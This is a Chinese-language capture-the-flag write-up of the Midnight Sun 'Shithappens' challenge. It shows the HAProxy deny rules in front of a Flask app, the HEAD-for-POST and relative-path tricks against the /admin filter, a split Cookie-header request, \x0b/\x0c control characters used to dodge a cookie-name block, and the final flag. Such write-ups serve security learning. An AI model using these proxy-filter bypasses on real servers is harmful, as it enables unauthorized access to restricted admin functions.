# Shithappens

這題後端套了一個 HAProxy，然後有一堆限制

例如 url 不能是 /admin 開頭、HTTP Method 不能是 POST

然後 cookie 長度要小於 69 之類的

具體規則如下:

```
global
  daemon
  log 127.0.0.1 local0 debug

defaults
  log               global
  retries           3
  maxconn           2000
  timeout connect   5s
  timeout client    50s
  timeout server    50s

resolvers docker_resolver
  nameserver dns 127.0.0.11:53

frontend internal_access
  bind 127.0.0.1:8080
  mode http
  use_backend test

frontend internet_access
  bind *:80
  errorfile 403 /etc/haproxy/errorfiles/403custom.http
  http-response set-header Server Server
  http-request deny if METH_POST
  http-request deny if { path_beg /admin }
  http-request deny if { cook(IMPERSONATE) -m found }
  http-request deny if { hdr_len(Cookie) gt 69 }
  mode http
  use_backend test

backend test
  balance roundrobin
  mode http
  server flaskapp app:8282 resolvers docker_resolver resolve-prefer ipv4
```

<br>

首先，繞 POST 限制很簡單

這個考點跟之前 GitHub Bug Bounty 的場景一樣，可以用 `HEAD` method 去做到 POST 的效果

而 `/admin` 限制可以用 `//admin` 或是 `admin` 之類的各種方法繞

最後發送以下 HEAD 請求:

```
HEAD admin HTTP/1.1
Host: shithappens-01.play.midnightsunctf.se
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------5164986806644135862031659149
Content-Length: 178
Referer: http://shithappens-01.play.midnightsunctf.se/
Connection: close, Cookie
Upgrade-Insecure-Requests: 1

-----------------------------5164986806644135862031659149
Content-Disposition: form-data; name="username"

admin
-----------------------------5164986806644135862031659149--
```

會拿到 admin 對應的 `IMPERSONATE` 和 `KEY` cookie

但是光是 `KEY` 的長度就快超過限制了

所以接下來要繞 cookie 長度限制

然後發現有 `/debug` 頁面，可以看到 flask 收到的請求細節

可以用這個來驗證我們的輸入最後會變啥樣

所以就自然而然地，發現可以用下面這種方式繞過長度限制:

```
Cookie: KEY=0be40039bcd8286eab237f481641b16e5e3ab442e0bc1135f08c143b22dc1efc;
cookie: ;IMPERSONATE=
cookie: admin
```

最後出來的 cookie 會變成:

```
{"KEY":"0be40039bcd8286eab237f481641b16e5e3ab442e0bc1135f08c143b22dc1efc", "IMPERSONATE":",admin"}
```

所以接下來要處理掉 IMPERSONATE 的那個 `,` 

但用力搞了一波都繞不過

最後是隊友fuzzing王靠 fuzzing 發現可以這樣繞過:

```
IMPERSONATE\x0b=admin

or

IMPERSONATE\x0c=admin
```

`midnight{hap_hap_h00r@y!!}`
